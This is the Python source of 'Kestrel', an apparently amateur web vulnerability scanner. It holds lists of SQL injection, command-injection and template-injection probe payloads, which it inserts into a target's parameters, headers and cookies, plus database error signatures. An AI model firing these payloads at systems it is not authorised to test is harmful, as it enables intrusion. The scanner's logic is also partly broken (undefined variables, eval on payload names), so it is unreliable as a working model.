#!/usr/bin/env python3
# KESTREL: A FAST VULNABILITY SCANNER
# Copyrights...
import requests, re, random, time, string, os, sys, argparse, copy
from colorama import init, Fore, Back, Style
init()

R = random.randint(1000000, 9999999)
ERROR_BASED_SQL = ('\'', '"', '(', ')')
BOOLEAN_BASED_SQL = ({True: i % (R, R), False: i % (R, R-1)} for i in ("' AND %d=%d-- -", "' AND %d=%d#", "' OR NOT (%d>%d)-- -", "' OR NOT (%d>%d)#", ' AND %d=%d-- -', ' AND %d=%d#', ' OR NOT (%d>%d)-- -', ' OR NOT (%d>%d)#', '" AND %d=%d-- -', '" AND %d=%d#', '" OR NOT (%d>%d)-- -', '" OR NOT (%d>%d)#', ') AND %d=%d-- -', ') AND %d=%d#', ') OR NOT (%d>%d)-- -', ') OR NOT (%d>%d)#', "') AND %d=%d-- -", "') AND %d=%d#", "') OR NOT (%d>%d)-- -", "') OR NOT (%d>%d)#", '") AND %d=%d-- -', '") AND %d=%d#', '") OR NOT (%d>%d)-- -', '") OR NOT (%d>%d)#'))
TIME_BASED_SQL = ("' AND (SELECT sleep(10))-- -", "' AND (SELECT sleep(10))#", "' ||pg_sleep(10)-- -", "' ||pg_sleep(10)#", ' AND (SELECT sleep(10))-- -', ' AND (SELECT sleep(10))#', ' ||pg_sleep(10)-- -', ' ||pg_sleep(10)#', '" AND (SELECT sleep(10))-- -', '" AND (SELECT sleep(10))#', '" ||pg_sleep(10)-- -', '" ||pg_sleep(10)#', ') AND (SELECT sleep(10))-- -', ') AND (SELECT sleep(10))#', ') ||pg_sleep(10)-- -', ') ||pg_sleep(10)#', "') AND (SELECT sleep(10))-- -", "') AND (SELECT sleep(10))#", "') ||pg_sleep(10)-- -", "') ||pg_sleep(10)#", '") AND (SELECT sleep(10))-- -', '") AND (SELECT sleep(10))#', '") ||pg_sleep(10)-- -', '") ||pg_sleep(10)#')
ERROR_BASED_RCE = [i % (R, R) for i in (';expr %d + %d', ';%d + %d', '&&expr %d + %d', '&&%d + %d', '|expr %d + %d', '|%d + %d', '||expr %d + %d', '||%d + %d', '`expr %d + %d`', '`%d + %d`', '$((expr %d + %d))', '$((%d + %d))', )]
ERROR_BASED_RCE+= [i % (R, R) for i in (';eval("%d+%d")', '&&eval("%d+%d")', '||eval("%d+%d")', '|eval("%d+%d")', )]
TIME_BASED_RCE  = ["||ping -c 10 127.0.0.1||",]
# todo://threads
SSTI = [i % (R, R) for i in ('${%d*%d}', '{{%d*%d}}', '{{%d*\'%d\'}}',)]
ALL_1 = ['ERROR_BASED_SQL', 'BOOLEAN_BASED_SQL', 'TIME_BASED_SQL', 'ERROR_BASED_RCE', 'TIME_BASED_RCE']
ALL_2 = ('ERROR_BASED_RCE', 'TIME_BASED_RCE', ) # TEST
INJECT, NOSCAN = 'INJECT', 'NOSCAN' # todo://add noscan(√)

SQL_ERROR_BASED_ERRORS = {
    "Python":               (r"Internal Server Error",),
    "MySQL":                (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL":           (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access":     (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle":               (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2":              (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite":               (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase":               (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*")
}

class Kestrel:
    def __init__(self, params):
        # url, data, header, cookie,
        self.p = params
        self.mark, self.mark2 = str(R + R), str(R*R)
        self.base_url = self.p['url'].split('?')[0]
        self.vulnerable = False
        self.payload = None
        self.verbose = params.get('verbose', False)

    def check_insert_point(self):
        retval = []
        for k in ('url', 'data', 'headers', 'cookies'):
            if re.search(NOSCAN, self.p.get(k)):
                continue
            if re.search(INJECT, self.p.get(k)):
                retval.append(k)
        return retval

    def check_noscan_point(self):
        for k in ('url', 'data', 'headers', 'cookies'):
            if re.search(NOSCAN, self.p.get(k)):
                self.p[k] = self.p[k].replace(NOSCAN, '')

    def _find_param_from_url_or_data(self, url_or_data):
        self._params = {}
        for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url_or_data):
            self._params[match.group('parameter')] = match.group('value')

    def _extract_header(self):
        self.r['headers'] = {i.split(': ')[0]:i.split(': ')[1] for i in self.p['headers'].split('\n')} if self.p['headers'] else {}
        self.r1['headers'] = {i.split(': ')[0]:i.split(': ')[1] for i in self.p['headers'].split('\n')} if self.p['headers'] else {}
        self.r2['headers'] = {i.split(': ')[0]:i.split(': ')[1] for i in self.p['headers'].split('\n')} if self.p['headers'] else {}

    def _extract_cookie(self):
        self.r['cookies'] = {i.split('=')[0]:i.split('=')[1] for i in self.p['cookies'].split('; ')} if self.p['cookies'] else {}
        self.r1['cookies'] = {i.split('=')[0]:i.split('=')[1] for i in self.p['cookies'].split('; ')} if self.p['cookies'] else {}
        self.r2['cookies'] = {i.split('=')[0]:i.split('=')[1] for i in self.p['cookies'].split('; ')} if self.p['cookies'] else {}

    def _get_request(self, p):
        try:
            return requests.get(p['url'], headers=p['headers'], cookies=p['cookies']) if not p.get('params') else requests.get(self.base_url, params=p['params'], headers=p['headers'], cookies=p['cookies'])
        except Exception as e:
            print(e)

    def _post_request(self, p):
        try:
            if self.verbose: print(p.get('params')) if p.get('params') else print(p.get('data'))
            return requests.post(p['url'], data=p['data'], headers=p['headers'], cookies=p['cookies']) if not p.get('params') else requests.post(p['url'], data=p['params'], headers=p['headers'], cookies=p['cookies'])
        except Exception as e:
            print(e)

    def origin_request(self):
        pass

    def _print_info(self, msg):
        # Schema 1
        print(f"[+] URL:      {self.p['url']}")
        print(f"[1] Position: Unknown")
        print(f"[1] Type:     {Fore.RED + msg}")
        print(f"[2] Payload:  {Fore.GREEN + self.payload}")
        print(Style.RESET_ALL, end='')
        # Schema 2
        # Output
        if self.p.get('output'):
            with open(self.p['output'], 'a') as f:
                f.write(f"[+] URL:      {self.p['url']}\n")
                f.write(f"[1] Postion:  Unknown\n")
                f.write(f"[2] Type:     {msg}\n")
                f.write(f"[3] Payload:  {self.payload}\n")

    def scan_error_based_sql(self):
        r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
        for tech, errs in SQL_ERROR_BASED_ERRORS.items():
            for err in errs:
                if re.search(err, r.text, re.I):
                    self.vulnerable = True
                    return self._print_info('Error Based SQL Injection')

    def scan_boolean_based_sql(self):
        r1 = self._get_request(self.r1) if not self.p['data'] else self._post_request(self.r1)
        r2 = self._get_request(self.r2) if not self.p['data'] else self._post_request(self.r2)
        if r1.status_code == r2.status_code == 200 and len(r1.text) != len(r2.text):
            self.vulnerable = True
            return self._print_info('Boolean Based SQL Injection')

    def scan_time_based_sql(self):
        stt = time.time()
        r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
        cst = time.time() - stt
        if cst >= 9:
            self.vulnerable = True
            return self._print_info('Time Based SQL Injection')

    def scan_error_based_rce(self):
        r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
        if re.search(self.mark, r.text):
            return self._print_info('Error Based RCE')

    def scan_time_based_rce(self):
        stt = time.time()
        r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
        cst = time.time() - stt
        if cst >= 9:
            self.vulnerable = True
            return self._print_info('Time Based RCE')

    def scan_ssti(self):
        r = self._get_request(self.r) if not self.p['data'] else self._post_request(self.r)
        if re.search(self.mark2, r.text):
            return self._print_info('SSTI')

    def start(self):
        ips = self.check_insert_point()
        self.check_noscan_point()
        self.r = copy.deepcopy(self.p)
        self.r1 = copy.deepcopy(self.p)
        self.r2 = copy.deepcopy(self.p)
        self._extract_header()
        self._extract_cookie()
        self._r, self._r1, self._r2 = copy.deepcopy(self.r), copy.deepcopy(self.r1), copy.deepcopy(self.r2)
        # read payloads
        if not self.p['scan_type']:
            payloads = {i:eval(i) for i in ALL}
        else: # todo://rewrite
            payloads[self.p['scan_type'].upper()] = eval(self.p['scan_type'].upper())
        if ips:
            # replace payload self.p['url']
            for k, vs in payloads.items():
                for v in vs:
                    self.payload = v
                    if not self.vulnerable and type(v) != dict:
                        for ip in ips:
                            if type(self.r[ip]) == str:
                                self.r[ip] = self.p[ip].replace(INJECT, v)
                            else:
                                for _k in self.r[ip].keys():
                                    self.r[ip][_k] = self._r[ip][_k].replace(INJECT, v)
                    elif not self.vulnerable and type(v) == dict:
                        for ip in ips:
                            if type(self.r[ip]) == str:
                                self.r1[ip] = self.p[ip].replace(INJECT, v[True])
                                self.r2[ip] = self.p[ip].replace(INJECT, v[False])
                            else:
                                for _k in self.r1[ip].keys():
                                    self.r1[ip][_k] = self._r1[ip][_k].replace(INJECT, v[True])
                                    self.r2[ip][_k] = self._r2[ip][_k].replace(INJECT, v[False])
                    eval(f"self.scan_{k.lower()}()")
        else:
            _ = self._find_param_from_url_or_data(self.r['url']) if not self.r['data'] else self._find_param_from_url_or_data(self.r['data'])
            for k, vs in payloads.items():
                for v in vs:
                    self.payload = v
                    if not self.vulnerable and type(v) != dict:
                        self.r['params'] = {}
                        for _k, _v in self._params.items():
                            self.r['params'][_k] = _v + v
                    elif not self.vulnerable and type(v) == dict:
                        self.r1['params'], self.r2['params'] = {}, {}
                        for _k, _v in self._params.items():
                            self.r1['params'][_k] = _v[True] + v
                            self.r2['params'][_v] = _v[False] + v
                    eval(f"self.scan_{k.lower()}()")

def parser():
    parser = argparse.ArgumentParser(prog='Kestrel', conflict_handler='resolve')
    # request
    '''
    // GET
    kestrel -u <url> 
    // POST
    kestrel -u <url> -d <data>
    // Cookie inject
    kestrel -u <url> -c "session=whatthefuckINJECT"
    '''
    parser.add_argument('-u', '--url', type=str, help='REQUEST URL, INSERT KEYWORD <INJECT> FOR TEST (e.g. -u http://target.com/?id=INJECT&cid=INJECT')
    parser.add_argument('-m', '--bulkfile', type=str, help='SCAN MULTIPLE TARGETS GIVEN IN A TEXTUAL FILE') # starts with http:// or https://
    # 首先检查url data header cookie中是否存在关键字INJECT, 如不存在,进行常规测试, 如存在,进行指定测试
    parser.add_argument('-d', '--data', type=str, default='', help='POST BODY')
    parser.add_argument('--headers', type=str, default='', help='REQUEST HEADER (e.g. User-Agent: _______\nReferer: ________')
    parser.add_argument('--cookies', type=str, default='', help='REQUEST COOKIE')
    # todo://设置不需要扫描的参数名 -> NOSCAN关键字(√)
    parser.add_argument('-st', '--scan-type', choices=('sql','rce','xss', 'ssti', 'redirect',), type=str, help='SCAN TYPE')
    parser.add_argument('-p', '--proxy', type=str, help='PROXY SERVER (e.g. http://127.0.0.1:8080')
    # parser.add_argument('--random-agent', action='store_true', help='ENABLE RANDOM AGENT')
    parser.add_argument('-v', '--verbose', action='store_true', help='VERBOSE')
    parser.add_argument('-t', '--threads', default=1, type=int, help='THREADS') # todo://
    parser.add_argument('-o', '--output', type=str, help='OUTPUT FILE')
    parser.add_argument('--debug', action='store_true', help='DEBUG MODE')
    parser.add_argument('-h', '--help', action='store_true', help='PRINT THIS')

    return parser

ap = parser()
args = ap.parse_args()
if args.help or not args.url:
    ap.print_help()
    sys.exit(0)

urls = []
if args.url:
    urls.append(args.url)
elif args.bulkfile:
    with open(args.bulkfile, 'r') as f:
        for line in f.readlines():
            urls.append(line.strip('\r').strip('\n'))

ALL = ALL_2 if args.debug else ALL_1
for url in urls:
    params = {}
    params['url']     = url
    params['data']    = args.data
    params['headers'] = args.headers
    params['cookies'] = args.cookies
    params['scan_type'] = args.scan_type
    params['proxy']   = args.proxy
    params['verbose'] = args.verbose
    params['output']  = args.output
    # random_agent = args.random_agent
    kestrel  = Kestrel(params)
    kestrel.start()

input()
